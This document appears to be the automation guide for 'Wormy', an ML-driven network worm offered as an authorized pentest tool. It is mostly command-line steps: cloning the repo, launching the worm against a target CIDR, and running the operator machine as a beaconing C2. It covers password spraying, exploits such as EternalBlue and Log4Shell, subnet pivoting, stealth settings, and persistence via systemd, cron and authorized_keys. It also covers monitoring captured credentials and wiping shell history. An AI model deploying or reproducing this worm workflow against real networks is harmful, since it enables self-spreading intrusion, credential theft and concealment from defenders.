# Automation Guide

How to run a full engagement with minimal manual steps. **Authorized use
only** — every command below assumes you own the target network or have
written permission to test it.

---

## 1. Concept: the operator host as C2

When you launch Wormy from your machine, that machine also acts as the **C2
server**. No external infrastructure is required. The `deploy_kali.sh` script
orchestrates everything:

```
Your Kali machine
  ├── auto-detected IP → C2 listener (port 8443)
  ├── config.yaml patched with your IP
  ├── Worm launched → beacons to you
  └── compromised agents → report back to your IP
```

**Benefits:**
- No external VPS — everything stays inside the engagement network
- The C2 is reachable from any compromised host on the same network
- C2 traffic never leaves the client network (maximum stealth)

---

## 2. One-command setup

```bash
git clone https://github.com/Ruby570bocadito/Wormy-ML-Network-Worm
cd Wormy-ML-Network-Worm

# Prepare everything (dry-run by default — safe)
sudo ./scripts/deploy_kali.sh

# When ready to attack (with authorization):
sudo ./scripts/deploy_kali.sh --live --target 192.168.1.0/24
```

What it automates (~2 minutes):

| Step | Action |
|---|---|
| 1 | Detects your real IP (`ip route get 8.8.8.8`) |
| 2 | Installs system packages (nmap, golang, libssl, freetds) |
| 3 | Installs Python deps: impacket, scapy, ldap3, pymssql, paramiko, bloodhound… |
| 4 | Starts the built-in Python HTTPS C2 (the former Go server in `stager/` was a non-compiling skeleton and was removed from the repo) |
| 5 | Patches `configs/config.yaml` with your IP as C2 |
| 6 | Validates that every worm module imports correctly |
| 7 | Pre-flight: C2 health, DoH, ping to the target range |
| 8 | Configures the kill switch |
| 9 | Launches the worm (only with `--live`) |

---

## 3. Full automated flow

```
┌─────────────────────────────────────────────────────────────────────┐
│  Kali machine (also the C2)                                         │
│                                                                     │
│  sudo ./scripts/deploy_kali.sh --live --target 10.0.1.0/24          │
│         │                                                           │
│         ├─[1-2]── install dependencies                              │
│         ├─[3]──── C2 up on :8443                                    │
│         │           └── curl http://localhost:8443/health → OK      │
│         ├─[4]──── patch config.yaml                                 │
│         │           └── c2_server: "192.168.1.50"                   │
│         │           └── target_range: "10.0.1.0/24"                 │
│         ├─[5]──── validate modules (10/10 OK)                       │
│         └─[6]──── launch engine                                     │
│                     ├── EnterpriseScanner → maps 10.0.1.0/24        │
│                     ├── RL agent → ranks targets by value           │
│                     ├── password engine → multi-protocol spray      │
│                     ├── exploits → MySQL/Redis/MSSQL/AD…            │
│                     ├── agent controller → per-agent SSH pool       │
│                     ├── wave propagation → subnet pivots            │
│                     └── resilient C2 → beacon to localhost:8443     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 4. Script options

```bash
sudo ./scripts/deploy_kali.sh [options]

--live                  Launch the worm after preparation
                        (default is dry-run — attacks nothing)

--target CIDR           Target IP range
                        e.g. --target 192.168.10.0/24
                        (defaults to your own /24)

--port PORT             C2 port (default: 8443)

--stealth LEVEL         Stealth level 1-3 (default: 3)
                        1 = aggressive/fast
                        3 = slow/stealthy/maximum jitter

--with-msf              Start Metasploit RPC (msfrpcd)
                        Enables: EternalBlue, Log4Shell, ProxyLogon
                        Requires Metasploit (bundled with Kali)

--skip-packages         Skip system package installation
```

---

## 5. Engagement lifecycle

### Phase 1 — Preparation (before the day)

```bash
git clone https://github.com/Ruby570bocadito/Wormy-ML-Network-Worm
cd Wormy-ML-Network-Worm
wormy doctor                     # environment check
sudo ./scripts/deploy_kali.sh    # dry-run — validates everything

# Scope in configs/config.yaml:
#   c2_server, target_range, excluded_hosts, kill_switch_file

# Verify the Docker lab if you'll demo it
wormy lab up && wormy lab urls
```

### Phase 2 — Launch

```bash
# Connect to the client network (VPN or physical access), then:
sudo ./scripts/deploy_kali.sh --live --target <AUTHORIZED_CIDR> --stealth 3
```

### Phase 3 — Monitoring

```bash
# Terminal 1: worm running in the background (deploy_kali.sh did it)

# Terminal 2: real-time dashboard
wormy run --web                 # → http://127.0.0.1:5000

# Terminal 3: C2 beacons
watch -n 5 "curl -sk http://localhost:8443/agents | python3 -m json.tool"

# Terminal 4: live logs
tail -f /tmp/wormy_run_*.log
```

### Phase 4 — Post-engagement

```bash
# 1. Kill switch (stops immediately)
touch STOP_WORMY_NOW

# 2. Clean every compromised host via SSH
python3 scripts/cleanup_engagement.py --agents-file data/agents.json

# 3. Export AD data to BloodHound
python3 utils/bloodhound_export.py \
  --input data/ad_intel.json --domain corp.local --out-dir /tmp/bloodhound_data/

# 4. Generate the audit report
python3 utils/audit_report.py

# 5. Clean the operator machine
python3 scripts/cleanup_engagement.py --local-only
```

---

## 6. Real-time monitoring

### Rich CLI dashboard

```bash
python3 monitoring/cli_monitor.py
```

Shows infected hosts, captured credentials, C2 beacons and the propagation
graph.

### Registered agents on the C2

```bash
curl -sk http://YOUR_IP:8443/agents | python3 -m json.tool

# Example response:
{
  "agent_abc123": {
    "last_seen": "2024-01-15T14:32:10",
    "data": {
      "ip": "10.0.1.25",
      "hostname": "FILESERVER",
      "pwned_count": 3,
      "os": "Windows Server 2019"
    }
  }
}
```

### C2 health

```bash
curl -sk http://YOUR_IP:8443/health
# {"status": "up", "agents": 7}
```

### Web dashboards (if enabled)

- `http://127.0.0.1:5000` — KPIs, topology, hosts, credentials, emergency stop
- `http://127.0.0.1:5001` — Armitage-style network map

---

## 7. Cleanup and delivery

### Automated cleanup of compromised hosts

```bash
# agents.json holds the compromised hosts:
# {"ip": "10.0.1.25", "username": "root", "password": "toor"}

python3 scripts/cleanup_engagement.py --agents-file /tmp/agents.json
python3 scripts/cleanup_engagement.py --local-only   # operator machine only
python3 scripts/cleanup_engagement.py --dry-run      # show, don't touch
```

**Removed from each remote host via SSH:**
worm files (`/tmp/.sysd`, `/tmp/wormy_*`), systemd persistence
(`sys-helper.service`), cron entries, `authorized_keys` lines added by the
worm, `.bashrc`/`.profile` entries, shell history.

**Removed locally:** log files, SQLite command queues (`.db`), PID files and
running processes, `/tmp/wormy_*`, local shell history, `config.yaml` backup
restored.

---

## 8. BloodHound integration

```bash
# With collected AD intel:
python3 utils/bloodhound_export.py \
  --input data/ad_intel.json --domain CORP.LOCAL --out-dir /tmp/bh_data/

# Demo data:
python3 utils/bloodhound_export.py --demo --domain CORP.LOCAL
```

Import in BloodHound: **Upload Data** → select the generated JSON files → run
queries such as *Find All Domain Admins*, *Shortest Path to Domain Admin*,
*Find Kerberoastable Users*, *Find AS-REP Roastable Users*.

The exporter generates `computers.json`, `users.json` and `groups.json`
(timestamped) with the worm's knowledge merged in (pwned flags, services).

---

## 9. Quick command reference

| Task | Command |
|---|---|
| Environment check | `wormy doctor` |
| Start lab | `wormy lab up` |
| Lab cheat-sheet | `wormy lab urls` |
| Recon only | `wormy scan --target <CIDR> -o scan.json` |
| Safe simulation | `wormy run --dry-run --target <CIDR>` |
| Live engagement | `wormy run --profile stealth --yes-i-am-authorized` |
| Web monitoring | `wormy run --web` → http://127.0.0.1:5000 |
| Interactive REPL | `wormy shell` |
| Emergency stop | `touch STOP_WORMY_NOW` |
| RL training | `wormy train rl --status` |
| Cleanup | `python3 scripts/cleanup_engagement.py --local-only` |
